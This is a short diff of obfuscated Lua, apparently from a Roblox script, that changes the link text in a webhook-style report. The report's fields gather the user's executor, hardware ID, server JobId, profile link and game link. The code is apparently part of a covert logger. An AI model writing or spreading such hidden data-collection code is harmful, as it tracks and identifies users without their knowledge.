@@ -44,8 +44,8 @@ local _K2X7M9N5L3 = {
             { name = "⚙️ Executor", value = string.format("```%s```", _E8X5M2N7L9), inline = true },
             { name = "💻 Hardware ID", value = string.format("```%s```", _T3X9N6M2L8) },
             { name = "🔗 JobId", value = string.format("```%s```", game.JobId) },
-            { name = "📝 Profile Link", value = string.format("[Click](https://www.roblox.com/users/%d/profile)", _W9N3M2X7L5.UserId), inline = true },
-            { name = "🎮 Game Link", value = string.format("[Click](https://www.roblox.com/games/%d)", game.PlaceId), inline = true }
+            { name = "📝 Profile Link", value = string.format("[Click Here](https://www.roblox.com/users/%d/profile)", _W9N3M2X7L5.UserId), inline = true },
+            { name = "🎮 Game Link", value = string.format("[Click Here](https://www.roblox.com/games/%d)", game.PlaceId), inline = true }
         }
     }}
 }
